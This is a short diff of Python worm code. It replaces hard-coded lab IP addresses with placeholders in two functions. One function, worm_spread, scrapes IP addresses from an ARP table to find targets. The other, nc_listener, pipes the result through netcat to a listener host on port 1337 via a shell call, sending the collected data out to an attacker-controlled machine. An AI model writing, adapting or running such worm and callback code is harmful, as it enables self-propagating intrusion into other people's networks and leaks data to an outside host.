@@ -22,7 +22,7 @@ def worm_spread():
     
     ips = re.findall(pattern, arp_list)
 
-    unwanted_ips = ["192.168.56.1", "192.168.56.100", "192.168.56.101"]
+    unwanted_ips = insert_unwanted_here
 
     for i in ips:
         if i not in unwanted_ips:
@@ -32,7 +32,7 @@ def worm_spread():
 
 def nc_listener():
     
-    listen_var="echo " + str(worm_spread()) + " | nc 192.168.56.108 1337"
+    listen_var="echo " + str(worm_spread()) + " | nc host_ip_here 1337"
 
     subprocess.call(listen_var, shell=True)
 
